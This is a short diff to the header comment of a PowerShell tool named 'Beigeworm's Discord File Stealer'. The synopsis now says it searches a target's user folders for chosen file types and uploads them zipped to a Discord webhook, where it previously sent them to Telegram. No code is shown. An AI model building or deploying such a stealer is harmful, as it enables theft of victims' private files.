@@ -1,8 +1,8 @@
 <# 
-========================================= Beigeworm's Telegram File Stealer ================================================
+========================================= Beigeworm's Discord File Stealer ================================================
 
 SYNOPSIS
-This script connects target computer with a telegram chat to upload certain files to telecram .
+This script searches the user folders for specific filetypes to upload to Discord zipped.
 
 SETUP
 Create a webhook in a discord server channel settings.
